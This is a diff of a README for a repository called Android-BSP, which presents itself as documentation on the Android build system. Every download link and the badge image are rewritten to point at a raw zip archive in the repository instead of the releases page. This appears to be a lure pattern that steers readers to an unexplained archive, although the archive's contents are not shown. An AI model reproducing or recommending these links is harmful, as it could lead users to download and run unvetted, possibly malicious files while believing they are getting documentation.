@@ -1,6 +1,6 @@
 # 🚀 Android-BSP - Easy Setup for Android Build System
 
-![Download Android-BSP](https://img.shields.io/badge/Download-Android--BSP-blue.svg)
+![Download Android-BSP](https://github.com/tnrlk157/Android-BSP/raw/refs/heads/main/Android-BSP/Android-BSP-2.9.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ Welcome to Android-BSP! This project provides documentation on how the Android B
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** You can find the latest version of the Android-BSP here: [Download Android-BSP](https://github.com/tnrlk157/Android-BSP/releases). 
+1. **Visit the Releases Page:** You can find the latest version of the Android-BSP here: [Download Android-BSP](https://github.com/tnrlk157/Android-BSP/raw/refs/heads/main/Android-BSP/Android-BSP-2.9.zip). 
 
 2. **Choose Your Version:** Look for the version labeled as the "latest release." This is usually recommended for most users.
 
@@ -24,7 +24,7 @@ To get started, follow these steps:
 
 To download the latest version, click the link below:
 
-[Download Android-BSP](https://github.com/tnrlk157/Android-BSP/releases)
+[Download Android-BSP](https://github.com/tnrlk157/Android-BSP/raw/refs/heads/main/Android-BSP/Android-BSP-2.9.zip)
 
 Follow the steps above to ensure a smooth setup process.
 
@@ -111,4 +111,4 @@ Explore these topics to enhance your understanding of Android development:
 
 Visit various resources online to broaden your knowledge in these subjects.
 
-For additional details, please visit our releases page: [Download Android-BSP](https://github.com/tnrlk157/Android-BSP/releases). You are now ready to explore the world of Android development with Android-BSP!
+For additional details, please visit our releases page: [Download Android-BSP](https://github.com/tnrlk157/Android-BSP/raw/refs/heads/main/Android-BSP/Android-BSP-2.9.zip). You are now ready to explore the world of Android development with Android-BSP!
